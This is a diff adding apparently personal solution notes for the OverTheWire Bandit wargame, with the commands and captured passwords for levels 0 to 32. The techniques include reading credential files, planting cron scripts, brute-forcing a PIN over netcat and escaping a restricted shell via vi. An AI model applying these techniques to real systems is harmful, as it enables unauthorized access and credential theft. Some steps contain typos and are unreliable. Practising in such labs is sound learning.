@@ -1,0 +1,533 @@
+### Bandit
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+bandit0@bandit.labs.overthewire.org's password: 
+Linux bandit.otw.local 5.4.8 x86_64 GNU/Linux
+
+      ,----..            ,----,          .---.
+     /   /   \         ,/   .`|         /. ./|
+    /   .     :      ,`   .'  :     .--'.  ' ;
+   .   /   ;.  \   ;    ;     /    /__./ \ : |
+  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
+  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
+  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
+  .   |  ' ' ' : `----'  |  |  \   ;  `      |
+  '   ;  \; /  |     '   :  ;   .   \    .\  ;
+   \   \  ',  /      |   |  '    \   \   ' \ |
+    ;   :    /       '   :  |     :   '  |--"
+     \   \ .'        ;   |.'       \   \ ;
+  www. `---` ver     '---' he       '---" ire.org
+
+
+Welcome to OverTheWire!
+
+If you find any problems, please report them to Steven or morla on
+irc.overthewire.org.
+
+--[ Playing the games ]--
+
+  This machine might hold several wargames.
+  If you are playing "somegame", then:
+
+    * USERNAMES are somegame0, somegame1, ...
+    * Most LEVELS are stored in /somegame/.
+    * PASSWORDS for each level are stored in /etc/somegame_pass/.
+
+  Write-access to homedirectories is disabled. It is advised to create a
+  working directory with a hard-to-guess name in /tmp/.  You can use the
+  command "mktemp -d" in order to generate a random and hard to guess
+  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
+  so that users can not snoop on eachother. Files and directories with
+  easily guessable or short names will be periodically deleted!
+
+  Please play nice:
+
+    * don't leave orphan processes running
+    * don't leave exploit-files laying around
+    * don't annoy other players
+    * don't post passwords or spoilers
+    * again, DONT POST SPOILERS!
+      This includes writeups of your solution on your blog or website!
+
+--[ Tips ]--
+
+  This machine has a 64bit processor and many security-features enabled
+  by default, although ASLR has been switched off.  The following
+  compiler flags might be interesting:
+
+    -m32                    compile for 32bit
+    -fno-stack-protector    disable ProPolice
+    -Wl,-z,norelro          disable relro
+
+  In addition, the execstack tool can be used to flag the stack as
+  executable on ELF binaries.
+
+  Finally, network-access is limited for most levels by a local
+  firewall.
+
+--[ Tools ]--
+
+ For your convenience we have installed a few usefull tools which you can find
+ in the following locations:
+
+    * gef (https://github.com/hugsy/gef) in /usr/local/gef/
+    * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/
+    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
+    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
+    * pwntools (https://github.com/Gallopsled/pwntools)
+    * radare2 (http://www.radare.org/)
+    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh
+
+--[ More information ]--
+
+  For more information regarding individual wargames, visit
+  http://www.overthewire.org/wargames/
+
+  For support, questions or comments, contact us through IRC on
+  irc.overthewire.org #wargames.
+
+  Enjoy your stay!
+
+
+--->lvl0
+ssh bandit0@bandit.labs.overthewire.org -p 2220      
+-----               
+cat readme
+boJ9jbbUNNfktd78OOpsqOltutMc3MY1
+-----
+
+
+--->lvl1
+ssh bandit1@bandit.labs.overthewire.org -p 2220
+-----
+cat ./-
+CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
+-----
+
+
+--->lvl2
+ssh bandit2@bandit.labs.overthewire.org -p 2220
+-----
+cat 'spaces in this filename'
+UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
+-----
+
+
+--->lvl3
+ssh bandit3@bandit.labs.overthewire.org -p 2220
+-----
+cd inhere
+ls -a
+cat .hidden
+pIwrPrtPN36QITSp3EQaw936yaFoFgAB
+-----
+
+
+--->lvl4
+ssh bandit4@bandit.labs.overthewire.org -p 2220
+-----
+cd inhere
+ls
+cat ./-file07
+koReBOKuIDDepwhWk7jZC0RTdopnAYKh
+-----
+
+
+--->lvl5
+ssh bandit5@bandit.labs.overthewire.org -p 2220
+-----
+cd inhere
+find . -type f -readable -size 1033c ! -executable
+cat ./maybehere07/.file2
+DXjZPULLxYr17uwoI01bNLQbtFemEgo7
+-----
+
+
+--->lvl6
+ssh bandit6@bandit.labs.overthewire.org -p 2220
+-----
+cd ..
+cd ..
+find . -type f -size 33c -group bandit6 -user bandit7
+cat ./var/lib/dpkg/info/bandit7.password
+HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
+-----
+
+
+--->lvl7
+ssh bandit7@bandit.labs.overthewire.org -p 2220
+-----
+grep -F "millionth" data.txt
+cvX2JJa4CFALtqS87jk27qwqGhBM9plV
+-----
+
+
+--->lvl8
+ssh bandit8@bandit.labs.overthewire.org -p 2220
+-----
+cat data.txt | sort | uniq -u
+UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
+-----
+
+
+--->lvl9
+ssh bandit9@bandit.labs.overthewire.org -p 2220
+-----
+strings data.txt | grep -G -e '=*='
+truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
+-----
+
+
+--->lvl10
+ssh bandit10@bandit.labs.overthewire.org -p 2220
+-----
+base64 -d data.txt
+IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
+-----
+
+
+--->lvl11
+ssh bandit11@bandit.labs.overthewire.org -p 2220
+-----
+cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
+-----
+
+
+--->lvl12
+ssh bandit12@bandit.labs.overthewire.org -p 2220
+-----
+create a temp directory, move the data.txt there and start:
+xxd -r data.txt data.bin
+from there use 'file data.bin' -> find the format 'mv' the file to that format 
+extension and decompress.  multiple times between gzip, tar and bzip2 ... CRAZY
+8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
+-----
+
+
+--->lvl13
+ssh bandit13@bandit.labs.overthewire.org -p 2220
+-----
+ssh -i sshkey.private bandit14@localhost
+-----
+cat /etc/bandit_pass/bandit14
+4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+-----
+
+
+--->lvl14
+ssh bandit14@bandit.labs.overthewire.org -p 2220
+-----
+nc localhostexit 30000
+then enter the current password: 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+BfMYroe26WYalil77FoDi9qh59eK5xNr
+-----
+
+
+--->lvl15
+ssh bandit15@bandit.labs.overthewire.org -p 2220
+-----
+openssl s_client -connect localhost:30001
+then enter the current password: BfMYroe26WYalil77FoDi9qh59eK5xNr
+cluFn7wTiGryunymYOu4RcffSxQluehd
+-----
+
+
+--->lvl16
+ssh bandit16@bandit.labs.overthewire.org -p 2220
+-----
+nmap -p 31000-32000 localhost
+-----
+openssl s_client -connect localhost:31790
+-----
+then copy the ssh key text and put it in sshkey.private file (creat the file)
+-----
+chmod 600 sshkey.private
+-----
+ssh -i sshkey.private bandit17@localhost
+-----
+cat /etc/bandit_pass/bandit17
+xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn
+-----
+
+
+--->lvl17
+ssh bandit17@bandit.labs.overthewire.org -p 2220
+-----
+diff passwords.new passwords.old
+the passwords that works:
+kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+-----
+
+
+--->lvl18
+ssh bandit18@bandit.labs.overthewire.org -p 2220
+----- ...
+when try to login you get logged out saying ‘Byebye!’
+-----
+ssh -T bandit18@bandit.labs.overthewire.org -p 2220
+now you can use the lvl 18 password
+-----
+cat readme
+IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+-----
+
+
+--->lvl19
+ssh bandit19@bandit.labs.overthewire.org -p 2220
+-----
+./bandit20-do cat /etc/bandit_pass/bandit20
+GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+-----
+
+
+--->lvl20
+ssh bandit19@bandit.labs.overthewire.org -p 2220
+-----
+open first terminal, login in and run
+nc -vlp 1234 < /etc/bandit_pass/bandit20
+-----
+open second terminal, login and run
+./suconnect 1234
+-----
+first terminal responds:
+gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+-----
+
+
+--->lvl21
+ssh bandit21@bandit.labs.overthewire.org -p 2220
+-----
+ls /etc/cron.d/
+cat /etc/cron.d/cronjob_bandit22
+cat /usr/bin/cronjob_bandit22.sh
+-----
+cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+-----
+
+
+--->lvl22
+ssh bandit22@bandit.labs.overthewire.org -p 2220
+-----
+ls /etc/cron.d/
+cat /etc/cron.d/cronjob_bandit23
+cat /usr/bin/cronjob_bandit23.sh
+-----
+/usr/bin/cronjob_bandit23.sh
+copy the script to a temp folder and change '$(whoami)' to 'bandit23'
+when you run it you get an error but also the temp folder name for bandit23
+-----
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+-----
+
+
+--->lvl23
+ssh bandit23@bandit.labs.overthewire.org -p 2220
+-----
+ls /etc/cron.d/
+cat /etc/cron.d/cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+-----
+cd /var/spools/bandiut24
+nano my.sh
+in your script put:
+
+#!/bin/bash
+
+cat /etc/bandit_pass/bandit24 > /tmp/my23
+
+-----
+chmod 777 my.sh
+then wait until its executed and deleted then
+cat /tmp/my23
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+-----
+
+
+--->lvl24
+ssh bandit24@bandit.labs.overthewire.org -p 2220
+-----
+mkdir /tmp/my24
+cd /tmp/my24
+-----
+nano my.sh
+in your script put:
+
+#!/bin/bash
+pass24=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+for i in {0000..9999}; do
+            echo "$pass24 $i"
+done | nc localhost 30002
+
+-----
+chmod 777 my.sh
+-----
+bash my.sh
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+-----
+
+
+--->lvl25
+ssh bandit25@bandit.labs.overthewire.org -p 2220
+-----
+ssh -i bandit26.sshkey bandit26@localhost
+but the connection will be closed!
+-----
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG | ssh -i bandit26.sshkey bandit26@localhost
+again connection closes but before it does it shows:
+
+::::::::::::::
+/home/bandit26/text.txt
+::::::::::::::
+
+-----
+cat /etc/passwd | grep bandit26
+cat /usr/bin/showtext
+-----
+to make more active reduce ternimal window size less than 6 lines then again:
+ssh -i bandit26.sshkey bandit26@localhost
+-----
+when showing more, press v to open vi editor then:
+
+:e /etc/bandit_pass/bandit26
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+-----
+
+
+--->lvl26
+ssh bandit26@bandit.labs.overthewire.org -p 2220
+but connection closes as before!
+-----
+same procedure once in vi pressing 'Esc + :' or ':' will let you input cmd
+and ':!' lets you execute normal shell cmd
+-----
+:set shell=/bin/bash
+:!ls -la
+-----
+:!./bandit27-do cat /etc/bandit_pass/bandit27
+3ba3118a22e93127a4ed485be72ef5ea
+-----
+
+
+--->lvl27
+ssh bandit27@bandit.labs.overthewire.org -p 2220 
+-----
+mkdir /tmp/my27/
+chmod 700 /tmp/my27/
+cd /tmp/my27/
+git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
+-----
+cd repo
+ls
+-----
+cat README
+0ef186ac70e04ea33b4c1853d2526fa2
+-----
+:::clean up afterward 'rm -rf /tmp/my27'
+
+
+--->lvl28
+ssh bandit28@bandit.labs.overthewire.org -p 2220
+-----
+everything as lvl27 but
+cat README.md
+will not give the pass.  gotta go back and check an older commit
+-----
+in repo folder:
+
+git log
+
+notice the commit before 'fix info leak' which is the last
+-----
+git checkout c086d11a00c0648d095d04c089786efef5e01264
+-----
+cat README.md
+bbc96594b4e001778eee9975372716b2
+-----
+
+
+--->lvl29
+ssh bandit29@bandit.labs.overthewire.org -p 2220
+-----
+same as previous level, instead of changing commit, we have to change branch.
+once in repo folder:
+
+cat README.md
+but no password
+-----
+git branch -r
+-----
+git checkout dev
+-----
+cat README.md
+5b90576bedb2cc04c86a9e924ce42faf
+-----
+
+
+--->lvl30
+ssh bandit30@bandit.labs.overthewire.org -p 2220
+-----
+like before clone the git repo and go tro repo folder
+-----
+cat README.md
+but there is no password
+-----
+git tag  -->: secret
+-----
+git show secret
+47e603bb428404d265f59c42920d81e5
+-----
+
+
+--->lvl31
+ssh bandit31@bandit.labs.overthewire.org -p 2220
+-----
+like before clone the git repo and go to repo
+-----
+cat README.md
+-----
+echo 'May I come in?' > key.txt
+-----
+git add key.txt
+but error
+-----
+git add -f key.txt
+-----
+git commit -m 'key.txt added'
+-----
+git push origin master
+56a9bf19c63d650ce78e6ec0354ee45e
+-----
+
+
+--->lvl32
+ssh bandit32@bandit.labs.overthewire.org -p 2220
+-----
+$0
+-----
+vi
+-----
+:e /etc/bandit_pass/bandit33
+c9c3199ddf4121b10cf581a98d51caee
+-----
+
+
+--->lvl33
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
